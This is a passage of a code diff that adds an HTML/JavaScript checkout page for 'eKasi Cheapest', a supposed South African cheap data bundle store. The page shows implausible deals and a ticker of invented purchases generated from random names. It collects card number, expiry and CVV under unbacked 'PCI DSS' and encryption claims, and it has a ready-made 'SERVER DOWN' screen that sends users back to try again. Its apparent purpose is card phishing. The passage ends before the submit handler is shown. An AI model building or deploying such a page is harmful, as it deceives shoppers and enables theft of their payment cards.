@@ -1,0 +1,685 @@
+<!doctype html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>eKasi Cheapest - Checkout</title>
+  <!-- Tailwind CSS for styling -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f4f5f7;
+            user-select: none;
+        }
+
+        /* Verified Badge Pulse Animation */
+        @keyframes verifiedPulse {
+            0%, 100% {
+                transform: scale(1);
+                filter: drop-shadow(0 0 2px rgba(29, 161, 242, 0.6));
+            }
+            50% {
+                transform: scale(1.18);
+                filter: drop-shadow(0 0 8px rgba(29, 161, 242, 0.9));
+            }
+        }
+        .verified-badge {
+            animation: verifiedPulse 2s infinite ease-in-out;
+        }
+
+        /* Shimmer Multi-Color Animated Notice Text */
+        .animated-rainbow-text {
+            background: linear-gradient(
+                90deg, 
+                #ff0000 0%, #ff7700 15%, #a8e000 30%, #00d4ff 45%, #9d00ff 60%, #ff007f 75%, #ff0000 100%
+            );
+            background-size: 200% auto;
+            color: transparent;
+            -webkit-background-clip: text;
+            background-clip: text;
+            animation: rainbowShift 4s linear infinite;
+        }
+
+        @keyframes rainbowShift {
+            0% { background-position: 0% center; }
+            100% { background-position: 200% center; }
+        }
+
+        /* Custom Radio Button & Highlight Styling */
+        .bundle-option { transition: all 0.2s ease-in-out; }
+        .bundle-option:active { transform: scale(0.99); }
+        .network-btn { transition: all 0.2s ease; }
+
+        /* Clockwise animated border container */
+        .animated-input-box {
+            position: relative;
+            border-radius: 14px;
+            padding: 2px;
+            background: #cbd5e1;
+            overflow: hidden;
+            transition: background 0.3s ease;
+        }
+
+        /* Continuous clockwise spinning beam when focused */
+        .animated-input-box.focused::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(
+                from 0deg,
+                transparent 0deg,
+                transparent 270deg,
+                #22c55e 360deg
+            );
+            animation: rotateClockwise 2s linear infinite;
+        }
+
+        @keyframes rotateClockwise {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Inner input styling covering the spinner */
+        .animated-input-inner {
+            position: relative;
+            background: #ffffff;
+            border-radius: 12px;
+            z-index: 1;
+            display: flex;
+            align-items: center;
+        }
+
+        /* Input field reset */
+        .custom-input {
+            width: 100%;
+            padding: 16px 18px;
+            font-size: 17px;
+            font-weight: 600;
+            color: #0f172a;
+            background: transparent;
+            border: none;
+            outline: none;
+            border-radius: 12px;
+        }
+
+        .custom-input::placeholder {
+            color: #94a3b8;
+            font-weight: 500;
+        }
+
+        /* Validation border colors */
+        .animated-input-box.invalid-card { background: #ef4444 !important; }
+        .animated-input-box.invalid-card::before { display: none !important; }
+        .animated-input-box.valid-card { background: #22c55e !important; }
+        .animated-input-box.valid-card::before { display: none !important; }
+
+        /* Pulsing Red Glow Animation for Error State */
+        @keyframes errorPulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(239, 68, 68, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
+        }
+        .error-icon-container { animation: errorPulse 2s infinite ease-in-out; }
+    </style>
+ </head>
+ <body class="min-h-screen flex items-center justify-center p-2 sm:p-4">
+  <!-- ================= SCREEN 1: BUNDLE SELECTION ================= -->
+  <div id="screen-1" class="w-full max-w-md bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100 relative my-auto">
+   <!-- Header Bar -->
+   <div class="flex justify-between items-center px-5 pt-5 pb-3 border-b border-gray-100">
+    <div class="flex items-center gap-2">
+     <h1 class="text-2xl font-black text-black tracking-tight">eKasi Cheapest</h1>
+     <svg class="w-6 h-6 verified-badge text-[#1D9BF0]" viewBox="0 0 24 24" fill="currentColor">
+      <path d="M22.5 12.5c0-1.58-.875-2.95-2.148-3.6.154-.435.238-.905.238-1.4 0-2.21-1.79-3.999-4-3.999-.495 0-.965.084-1.4.238C14.55 2.475 13.18 1.6 11.6 1.6c-1.58 0-2.95.875-3.6 2.148-.435-.154-.905-.238-1.4-.238-2.21 0-4 1.79-4 4 0 .495.084.965.238 1.4C1.575 9.55.7 10.92.7 12.5c0 1.58.875 2.95 2.148 3.6-.154.435-.238.905-.238 1.4 0 2.21 1.79 4 4 4 .495 0 .965-.084 1.4-.238.65 1.273 2.02 2.148 3.6 2.148 1.58 0 2.95-.875 3.6-2.148.435.154.905.238 1.4.238 2.21 0 4-1.79 4-4 0-.495-.084-.965-.238-1.4 1.273-.65 2.148-2.02 2.148-3.6zm-11.83 4.47l-4.14-4.14 1.41-1.41 2.73 2.73 6.83-6.83 1.41 1.41-8.24 8.24z" />
+     </svg>
+    </div>
+    <button onclick="shareApp()" class="p-2 text-gray-600 hover:text-black rounded-full hover:bg-gray-100 transition-colors"> 
+     <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
+      <path stroke-linecap="round" stroke-linejoin="round" d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z" />
+     </svg> 
+    </button>
+   </div>
+   <!-- Animated Notice Banner -->
+   <div class="p-4 bg-gray-50/50">
+    <p class="animated-rainbow-text font-black text-xl sm:text-2xl leading-tight uppercase tracking-tight text-left">NB: ALL SUCCESSFUL PURCHASES MADE WILL AUTOMATICALLY PUT AN ENTRY ON THE MEGA DRAW</p>
+   </div>
+   <!-- Network Selector Buttons -->
+   <div class="px-4 py-3 grid grid-cols-4 gap-2 sm:gap-3">
+    <button onclick="selectNetwork('Vodacom')" id="net-Vodacom" class="network-btn flex flex-col items-center justify-center h-16 rounded-xl border-2 border-gray-200 bg-white shadow-sm hover:shadow text-red-600 font-extrabold text-sm sm:text-base"> Vodacom </button> <button onclick="selectNetwork('Telkom')" id="net-Telkom" class="network-btn flex flex-col items-center justify-center h-16 rounded-xl bg-[#0081c6] text-white font-extrabold text-sm sm:text-base hover:bg-blue-600"> Telkom </button> <button onclick="selectNetwork('MTN')" id="net-MTN" class="network-btn flex flex-col items-center justify-center h-16 rounded-xl bg-[#ffcc00] text-black font-black text-sm sm:text-base hover:bg-yellow-400"> MTN </button> <button onclick="selectNetwork('Cell C')" id="net-Cell C" class="network-btn flex flex-col items-center justify-center h-16 rounded-xl bg-[#f35900] text-white font-extrabold text-sm sm:text-base hover:bg-orange-600"> Cell C </button>
+   </div>
+   <!-- Live Ticker -->
+   <div class="py-2.5 px-4 border-y border-gray-100 bg-blue-50/60 flex items-center gap-3 overflow-hidden">
+    <div class="flex-shrink-0 w-8 h-8 rounded-full bg-blue-600 text-white font-black text-xs flex items-center justify-center shadow-sm" id="ticker-avatar">SI</div>
+    <div class="flex-1 truncate">
+     <div class="flex items-center justify-between text-xs font-bold">
+      <span id="ticker-name" class="text-gray-900 tracking-tight">Sphiwe Dlamini <span class="font-normal text-gray-500">from Soweto</span></span> <span id="ticker-time" class="text-blue-600 font-extrabold">12s ago</span>
+     </div>
+     <div id="ticker-bundle" class="text-[11px] font-extrabold text-emerald-700 truncate uppercase mt-0.5">VODACOM 1GB ANYTIME DATA @R1</div>
+    </div>
+   </div>
+   <!-- Bundle Selection Trigger Header -->
+   <div class="p-4 border-b border-gray-200 bg-gray-100 flex justify-between items-center cursor-pointer" onclick="openBundleModal()">
+    <div class="flex items-center gap-2">
+     <span class="font-extrabold text-gray-800 tracking-wide uppercase text-sm sm:text-base">PLEASE SELECT BUNDLE TYPE</span> <span class="text-blue-600 font-black">-------&gt;</span>
+    </div>
+    <svg class="w-6 h-6 text-teal-700" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+     <circle cx="12" cy="12" r="9" stroke="currentColor" /><circle cx="12" cy="12" r="3" fill="currentColor" />
+    </svg>
+   </div>
+   <!-- Display Box of Currently Selected Bundle -->
+   <div id="selected-bundle-box" onclick="openBundleModal()" class="m-4 p-3.5 bg-blue-50 border-2 border-blue-200 rounded-xl cursor-pointer hover:bg-blue-100 transition-colors flex justify-between items-center">
+    <div class="pr-2">
+     <div class="text-xs font-bold text-blue-600 uppercase tracking-wider">Selected Bundle</div>
+     <div id="selected-bundle-text" class="text-sm font-bold text-gray-900 mt-0.5">SELECT NETWORK PROVIDER</div>
+    </div>
+    <span class="text-xs bg-blue-600 text-white font-bold px-2.5 py-1 rounded-full whitespace-nowrap">Change</span>
+   </div>
+   <!-- Phone Number Input -->
+   <div class="px-4 pb-4">
+    <label class="block text-xs font-bold text-gray-600 uppercase mb-1.5">Enter Cellphone Number</label>
+    <div class="relative flex items-center">
+     <div class="absolute left-3 flex items-center gap-1.5 pointer-events-none">
+      <svg class="w-6 h-4 rounded-sm shadow-sm" viewBox="0 0 900 600">
+       <rect width="900" height="600" fill="#007a3d" /> <path d="M0,0 L450,300 L0,600 Z" fill="#000000" /> <path d="M0,0 L450,300 L0,600" stroke="#ffb81c" stroke-width="60" /> <path d="M0,0 L900,0 L900,200 L300,200 L0,0" fill="#de3831" /> <path d="M0,600 L900,600 L900,400 L300,400 L0,600" fill="#002395" /> <path d="M0,0 L900,0 L900,200 L300,200 Z" stroke="#ffffff" stroke-width="30" fill="none" /> <path d="M0,600 L900,600 L900,400 L300,400 Z" stroke="#ffffff" stroke-width="30" fill="none" />
+      </svg>
+      <span class="font-bold text-gray-700 text-sm sm:text-base">+27</span>
+     </div>
+     <input type="tel" id="phone-input" placeholder="61 234 5678" maxlength="9" oninput="validateScreen1()" class="w-full pl-24 pr-4 py-3 bg-gray-50 border-2 border-gray-300 rounded-xl focus:outline-none focus:border-green-500 font-bold text-gray-900 tracking-wider text-base transition-colors">
+    </div>
+    <p class="text-xs text-gray-400 mt-1 pl-1">Enter 9 digits after +27 (e.g., 821234567)</p>
+   </div>
+   <!-- Checkout Button -->
+   <div class="p-4 bg-gray-50 border-t border-gray-100">
+    <button id="checkout-btn" disabled onclick="goToScreen(2)" class="w-full py-4 px-6 rounded-xl font-black text-lg tracking-wide uppercase text-white shadow-lg flex items-center justify-center gap-3 transition-all duration-200 bg-gray-400 cursor-not-allowed opacity-60"> 
+     <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+      <path stroke-linecap="round" stroke-linejoin="round" d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z" />
+     </svg> 
+     <span>CHECKOUT</span> 
+    </button>
+   </div>
+  </div>
+  <!-- BUNDLE SELECTION MODAL -->
+  <div id="bundle-modal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-2 hidden">
+   <div class="bg-white rounded-2xl w-full max-w-md max-h-[85vh] flex flex-col shadow-2xl border border-gray-200 overflow-hidden">
+    <div class="p-4 border-b border-gray-200 flex justify-between items-center bg-gray-50">
+     <div>
+      <h3 class="font-extrabold text-gray-800 text-sm sm:text-base uppercase tracking-tight">PLEASE SELECT BUNDLE TYPE</h3>
+      <p class="text-xs text-gray-500 font-medium">Network: <span id="modal-network-name" class="font-black text-blue-600">Vodacom</span></p>
+     </div>
+     <button onclick="closeBundleModal()" class="text-gray-400 hover:text-gray-700 p-1.5 rounded-full hover:bg-gray-200"> 
+      <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+       <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+      </svg> 
+     </button>
+    </div>
+    <div class="overflow-y-auto divide-y divide-gray-200 flex-1" id="bundle-list"></div>
+    <div class="p-3 bg-gray-100 border-t border-gray-200 flex justify-end">
+     <button onclick="closeBundleModal()" class="px-5 py-2.5 bg-green-600 hover:bg-green-700 text-white font-extrabold rounded-xl uppercase tracking-wider text-sm shadow"> Done </button>
+    </div>
+   </div>
+  </div>
+  <!-- ================= SCREEN 2: PAYMENT DETAILS ================= -->
+  <div id="screen-2" class="w-full max-w-lg bg-white rounded-3xl p-6 sm:p-9 shadow-2xl border border-slate-100 relative hidden">
+   <!-- Top Navigation Header with Back Button -->
+   <div class="flex justify-between items-center mb-6 pb-4 border-b border-slate-100">
+    <div class="flex items-center gap-3">
+     <button onclick="goToScreen(1)" class="p-2 text-slate-600 hover:text-slate-900 bg-slate-100 hover:bg-slate-200 rounded-full transition-colors"> 
+      <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+       <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+      </svg> 
+     </button>
+     <div>
+      <h2 class="text-2xl font-black text-slate-900 tracking-tight">BANK DETAILS</h2>
+      <p class="text-xs font-semibold text-slate-500 mt-0.5">Encrypted &amp; Protected checkout</p>
+     </div>
+    </div>
+    <div class="flex items-center gap-1.5 bg-emerald-50 text-emerald-700 px-3 py-1.5 rounded-full text-xs font-bold border border-emerald-200">
+     <svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 20 20">
+      <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" />
+     </svg>
+     <span>SECURED</span>
+    </div>
+   </div>
+   <form id="payment-form" onsubmit="handlePaySubmit(event)" class="space-y-5">
+    <!-- Cardholder Name -->
+    <div>
+     <label class="block text-slate-700 text-xs font-bold uppercase tracking-wider mb-2">Cardholder Name</label>
+     <div class="animated-input-box" id="box-name">
+      <div class="animated-input-inner">
+       <input type="text" id="cardholder-name" name="ccname" autocomplete="cc-name" placeholder="M.S Oliver" class="custom-input" onfocus="addFocus('box-name')" onblur="removeFocus('box-name')" oninput="validateScreen2()">
+      </div>
+     </div>
+    </div>
+    <!-- Card Number -->
+    <div>
+     <label class="block text-slate-700 text-xs font-bold uppercase tracking-wider mb-2">Card Number</label>
+     <div class="animated-input-box" id="box-number">
+      <div class="animated-input-inner pr-3">
+       <input type="text" id="card-number" name="ccnumber" autocomplete="cc-number" placeholder="4532XXXXXXXX" maxlength="19" class="custom-input font-mono tracking-wider" onfocus="addFocus('box-number')" onblur="removeFocus('box-number')" oninput="handleCardInput(this)">
+       <div id="card-logo" class="w-16 h-10 flex items-center justify-end flex-shrink-0">
+        <span class="text-xs text-slate-400 font-extrabold uppercase tracking-wide">CARD</span>
+       </div>
+      </div>
+     </div>
+     <p id="card-error" class="text-xs text-red-500 font-bold mt-1.5 hidden flex items-center gap-1">
+      <svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 20 20">
+       <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
+      </svg>
+      Invalid card number sequence
+     </p>
+    </div>
+    <!-- Expiry & CVV -->
+    <div class="grid grid-cols-2 gap-4">
+     <div>
+      <label class="block text-slate-700 text-xs font-bold uppercase tracking-wider mb-2">Expiry Date</label>
+      <div class="animated-input-box" id="box-expiry">
+       <div class="animated-input-inner">
+        <input type="text" id="expiry-date" name="ccexp" autocomplete="cc-exp" placeholder="MM/YY" maxlength="5" class="custom-input text-center font-mono tracking-widest" onfocus="addFocus('box-expiry')" onblur="removeFocus('box-expiry')" oninput="handleExpiryInput(this)">
+       </div>
+      </div>
+     </div>
+     <div>
+      <label class="block text-slate-700 text-xs font-bold uppercase tracking-wider mb-2">CVV / CVC</label>
+      <div class="animated-input-box" id="box-cvv">
+       <div class="animated-input-inner">
+        <input type="password" id="cvv-number" name="cccsc" autocomplete="cc-csc" placeholder="428" maxlength="4" class="custom-input text-center font-mono tracking-widest" onfocus="addFocus('box-cvv')" onblur="removeFocus('box-cvv')" oninput="handleCVVInput(this)">
+       </div>
+      </div>
+     </div>
+    </div>
+    <!-- PAY BUTTON -->
+    <div class="pt-4">
+     <button type="submit" id="pay-button" disabled class="w-full py-4 rounded-2xl font-black text-lg text-white bg-slate-300 cursor-not-allowed transition-all duration-300 shadow-md uppercase tracking-wider flex items-center justify-center gap-2"> <span id="pay-button-text">PAY NOW</span> 
+      <svg id="pay-spinner" class="w-5 h-5 text-white animate-spin hidden" fill="none" viewBox="0 0 24 24">
+       <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" /> <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+      </svg> </button>
+    </div>
+    <!-- Security Footer -->
+    <div class="flex flex-col items-center justify-center gap-1.5 pt-3 text-slate-500 text-xs font-bold tracking-tight text-center">
+     <div class="flex items-center gap-1.5 text-emerald-600">
+      <svg class="w-4 h-4 flex-shrink-0" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+       <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+      </svg>
+      <span>PCI DSS Compliance • 256-Bit SSL Encryption</span>
+     </div>
+     <span class="text-[11px] text-slate-400 font-normal">Your transaction is fully encrypted and securely processed.</span>
+    </div>
+   </form>
+  </div>
+  <!-- ================= SCREEN 3: ERROR STATE ================= -->
+  <div id="screen-3" class="w-full max-w-md bg-white rounded-3xl p-8 sm:p-10 shadow-2xl border border-red-100 text-center relative overflow-hidden hidden">
+   <!-- Top Accent Warning Bar -->
+   <div class="absolute top-0 left-0 right-0 h-2 bg-red-500"></div>
+   <!-- Top Left Back Button -->
+   <div class="absolute top-4 left-4">
+    <button onclick="goToScreen(2)" class="p-2 text-slate-600 hover:text-slate-900 bg-slate-100 hover:bg-slate-200 rounded-full transition-colors"> 
+     <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+      <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+     </svg> 
+    </button>
+   </div>
+   <!-- Red Cross Error Icon -->
+   <div class="mx-auto flex items-center justify-center w-24 h-24 bg-red-100 rounded-full mb-6 error-icon-container mt-2">
+    <svg class="w-12 h-12 text-red-600" fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+     <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+    </svg>
+   </div>
+   <!-- Status Titles -->
+   <h1 class="text-xs font-black tracking-widest text-red-500 uppercase mb-1">PAYMENT PENDING</h1>
+   <h2 class="text-3xl font-black text-slate-900 tracking-tight mb-3">SERVER DOWN</h2>
+   <!-- Description -->
+   <p class="text-slate-600 text-sm font-medium leading-relaxed mb-8">We are currently unable to reach the payment gateway servers. Your transaction could not be processed at this moment. Please try again later.</p>
+   <!-- Action Buttons -->
+   <div class="space-y-3">
+    <button onclick="goToScreen(2)" class="w-full py-4 rounded-2xl font-black text-lg text-white bg-red-600 hover:bg-red-700 active:scale-[0.99] cursor-pointer transition-all duration-300 shadow-xl shadow-red-600/30 uppercase tracking-wider"> TRY AGAIN </button> <button onclick="goToScreen(1)" class="w-full py-3.5 rounded-2xl font-bold text-base text-slate-700 bg-slate-100 hover:bg-slate-200 active:scale-[0.99] cursor-pointer transition-all duration-300 uppercase tracking-wider"> GO BACK </button>
+   </div>
+   <!-- Footer -->
+   <div class="mt-8 pt-4 border-t border-slate-100 flex items-center justify-center gap-1.5 text-slate-400 text-xs font-bold">
+    <svg class="w-4 h-4 text-slate-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+     <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+    </svg>
+    <span>Error Code: 503 - Gateway Unavailable</span>
+   </div>
+  </div>
+  <!-- Toast Notification Container -->
+  <div id="toast" class="fixed top-5 left-1/2 -translate-x-1/2 z-50 bg-gray-900 text-white px-6 py-3 rounded-full shadow-xl font-bold text-sm hidden flex items-center gap-2">
+   <span id="toast-message"></span>
+  </div>
+  <script>
+        // State variables
+        let selectedNetwork = '';
+        let selectedBundleIndex = null;
+        let isCardValid = false;
+
+        // Screen Navigation Logic
+        function goToScreen(screenNumber) {
+            document.getElementById('screen-1').classList.add('hidden');
+            document.getElementById('screen-2').classList.add('hidden');
+            document.getElementById('screen-3').classList.add('hidden');
+            
+            document.getElementById(`screen-${screenNumber}`).classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // 150 Randomized South African Names & Locations
+        const saBuyers = [
+            { name: "Sphiwe Dlamini", location: "Soweto" }, { name: "Lerato Mokoena", location: "Johannesburg" },
+            { name: "Mandla Khumalo", location: "Durban" }, { name: "Zinhle Zulu", location: "Pietermaritzburg" },
+            { name: "Francois van der Merwe", location: "Pretoria" }, { name: "Nomvula Ndlovu", location: "Tembisa" },
+            { name: "Bongani Sithole", location: "Nelspruit" }, { name: "Thabo Mofokeng", location: "Bloemfontein" },
+            { name: "Chantel Peters", location: "Cape Town" }, { name: "Pieter du Plessis", location: "Polokwane" }
+        ];
+
+        const baseBundles = [
+            { isHotDeal: true, template: "{NET} FIRST TIME OFFER 1GB ANYTIME DATA @R1 VALID 3DAYS", oldPrice: "R20", newPrice: "R1", discount: "90% OFF" },
+            { template: "{NET} 500MB @R3 VALID 7DAYS" },
+            { template: "{NET} SOCIAL PASS 3GB @R20 VALID 3 DAYS" },
+            { template: "{NET} DATA 1.5GB @R15 VALID 7DAYS" },
+            { template: "{NET} WHATSAPP DATA 2GB @R20 VALID 30 DAYS" },
+            { template: "{NET} DATA 5GB @R50 VALID 30 DAYS" },
+            { template: "{NET} DATA 10GB +200MB FREE @R45 VALID 30 DAYS" },
+            { template: "{NET} DATA 10GB DAY + 10GB NIGHT @R60 VALID 30 DAYS" }
+        ];
+
+        window.onload = function() {
+            renderBundles();
+            startLiveTicker();
+        };
+
+        function startLiveTicker() {
+            updateTickerItem();
+            setInterval(updateTickerItem, 4000);
+        }
+
+        function updateTickerItem() {
+            const randomBuyer = saBuyers[Math.floor(Math.random() * saBuyers.length)];
+            const networks = ["VODACOM", "TELKOM", "MTN", "CELL C"];
+            const randomNet = networks[Math.floor(Math.random() * networks.length)];
+            const randomBundleObj = baseBundles[Math.floor(Math.random() * baseBundles.length)];
+            const bundleName = randomBundleObj.template.replace("{NET}", randomNet);
+            const randomSeconds = Math.floor(Math.random() * 35) + 2;
+            const nameParts = randomBuyer.name.split(" ");
+            const initials = (nameParts[0][0] + (nameParts[1] ? nameParts[1][0] : "")).toUpperCase();
+
+            document.getElementById('ticker-avatar').innerText = initials;
+            document.getElementById('ticker-name').innerHTML = `${randomBuyer.name} <span class="font-normal text-gray-500">from ${randomBuyer.location}</span>`;
+            document.getElementById('ticker-time').innerText = `${randomSeconds}s ago`;
+            document.getElementById('ticker-bundle').innerText = bundleName;
+        }
+
+        function selectNetwork(network) {
+            selectedNetwork = network;
+            ['Vodacom', 'Telkom', 'MTN', 'Cell C'].forEach(net => {
+                const btn = document.getElementById(`net-${net}`);
+                if (net === network) {
+                    btn.classList.add('ring-4', 'ring-green-500', 'scale-[1.02]', 'shadow-md');
+                } else {
+                    btn.classList.remove('ring-4', 'ring-green-500', 'scale-[1.02]', 'shadow-md');
+                }
+            });
+            document.getElementById('modal-network-name').innerText = selectedNetwork;
+            renderBundles();
+            if (selectedBundleIndex !== null) updateSelectedBundleDisplay();
+            showToast(`Switched network to ${network}`);
+        }
+
+        function renderBundles() {
+            const container = document.getElementById('bundle-list');
+            container.innerHTML = '';
+            const activeNet = selectedNetwork !== "" ? selectedNetwork.toUpperCase() : "SELECT NETWORK PROVIDER";
+
+            baseBundles.forEach((bundle, index) => {
+                const titleText = bundle.template.replace('{NET}', activeNet);
+                const isSelected = selectedBundleIndex === index;
+                const item = document.createElement('div');
+                item.className = `bundle-option p-4 flex items-center justify-between cursor-pointer hover:bg-gray-50 transition-colors ${isSelected ? 'bg-green-50/70' : ''}`;
+                item.onclick = () => selectBundle(index);
+
+                let contentHtml = bundle.isHotDeal ? `
+                    <div class="pr-3">
+                        <div class="flex items-center gap-2 mb-1">
+                            <span class="bg-red-600 text-white text-[10px] font-black px-2 py-0.5 rounded tracking-wider animate-pulse">HOT DEAL</span>
+                            <span class="bg-amber-400 text-black text-[10px] font-black px-2 py-0.5 rounded">${bundle.discount}</span>
+                        </div>
+                        <div class="font-extrabold text-gray-900 text-xs sm:text-sm leading-snug uppercase">${titleText}</div>
+                        <div class="text-xs mt-0.5">
+                            <span class="line-through text-gray-400 font-bold mr-1.5">${bundle.oldPrice}</span>
+                            <span class="text-red-600 font-black text-sm">${bundle.newPrice}</span>
+                        </div>
+                    </div>` : `
+                    <div class="pr-3">
+                        <div class="font-extrabold text-gray-900 text-xs sm:text-sm leading-snug uppercase">${titleText}</div>
+                    </div>`;
+
+                const radioHtml = `
+                    <div class="flex-shrink-0">
+                        <div class="w-6 h-6 rounded-full border-2 ${isSelected ? 'border-teal-600 bg-teal-600' : 'border-gray-400'} flex items-center justify-center">
+                            ${isSelected ? '<div class="w-2.5 h-2.5 bg-white rounded-full"></div>' : ''}
+                        </div>
+                    </div>`;
+
+                item.innerHTML = contentHtml + radioHtml;
+                container.appendChild(item);
+            });
+        }
+
+        function selectBundle(index) {
+            if (selectedNetwork === "") {
+                showToast("Please select a network provider first!");
+                return;
+            }
+            selectedBundleIndex = index;
+            renderBundles();
+            updateSelectedBundleDisplay();
+            validateScreen1();
+            closeBundleModal();
+        }
+
+        function updateSelectedBundleDisplay() {
+            if (selectedBundleIndex === null) return;
+            const bundle = baseBundles[selectedBundleIndex];
+            const bundleText = bundle.template.replace('{NET}', selectedNetwork.toUpperCase());
+            document.getElementById('selected-bundle-text').innerText = bundleText;
+        }
+
+        function openBundleModal() {
+            if (selectedNetwork === "") {
+                showToast("Please select network provider first!");
+                return;
+            }
+            document.getElementById('bundle-modal').classList.remove('hidden');
+        }
+
+        function closeBundleModal() {
+            document.getElementById('bundle-modal').classList.add('hidden');
+        }
+
+        function validateScreen1() {
+            const phoneInput = document.getElementById('phone-input').value.trim();
+            const checkoutBtn = document.getElementById('checkout-btn');
+            const isPhoneValid = /^[6-8][0-9]{8}$/.test(phoneInput);
+            const isBundleSelected = selectedBundleIndex !== null;
+            const isNetworkChosen = selectedNetwork !== "";
+
+            if (isNetworkChosen && isPhoneValid && isBundleSelected) {
+                checkoutBtn.disabled = false;
+                checkoutBtn.className = "w-full py-4 px-6 rounded-xl font-black text-lg tracking-wide uppercase text-white shadow-xl flex items-center justify-center gap-3 transition-all duration-200 bg-green-600 hover:bg-green-700 active:scale-[0.99] cursor-pointer ring-4 ring-green-200";
+            } else {
+                checkoutBtn.disabled = true;
+                checkoutBtn.className = "w-full py-4 px-6 rounded-xl font-black text-lg tracking-wide uppercase text-white shadow-lg flex items-center justify-center gap-3 transition-all duration-200 bg-gray-400 cursor-not-allowed opacity-60";
+            }
+        }
+
+        // LOGOS & SCREEN 2 LOGIC
+        const LOGOS = {
+            visa: `<svg class="h-8 w-16" viewBox="0 0 64 36" fill="none"><rect width="64" height="36" rx="6" fill="white"/><text x="6" y="25" fill="#1434CB" font-family="Inter, sans-serif" font-weight="900" font-style="italic" font-size="21" letter-spacing="-1px">VISA</text></svg>`,
+            mastercard: `<svg class="h-8 w-16" viewBox="0 0 64 36" fill="none"><rect width="64" height="36" rx="6" fill="white"/><circle cx="24" cy="14" r="9" fill="#EB001B"/><circle cx="38" cy="14" r="9" fill="#F79E1B"/><path d="M31 7.3999C32.6974 8.84715 33.7999 10.9926 33.7999 13.4C33.7999 15.8074 32.6974 17.9529 31 19.4001C29.3026 17.9529 28.2001 15.8074 28.2001 13.4C28.2001 10.9926 29.3026 8.84715 31 7.3999Z" fill="#FF5F00"/><text x="13" y="31" fill="#000000" font-family="Inter, sans-serif" font-weight="700" font-size="7.5">mastercard.</text></svg>`,
+            amex: `<svg class="h-8 w-16" viewBox="0 0 64 36" fill="none"><rect width="64" height="36" rx="6" fill="#006FCF"/><text x="6" y="15" fill="white" font-family="Inter, sans-serif" font-weight="900" font-size="8.5" letter-spacing="0.5px">AMERICAN</text><text x="6" y="26" fill="white" font-family="Inter, sans-serif" font-weight="900" font-size="8.5" letter-spacing="0.5px">EXPRESS</text></svg>`
+        };
+
+        function addFocus(id) { document.getElementById(id).classList.add('focused'); }
+        function removeFocus(id) { document.getElementById(id).classList.remove('focused'); }
+
+        function checkLuhn(number) {
+            let sum = 0, shouldDouble = false;
+            for (let i = number.length - 1; i >= 0; i--) {
+                let digit = parseInt(number.charAt(i));
+                if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return (sum % 10) === 0;
+        }
+
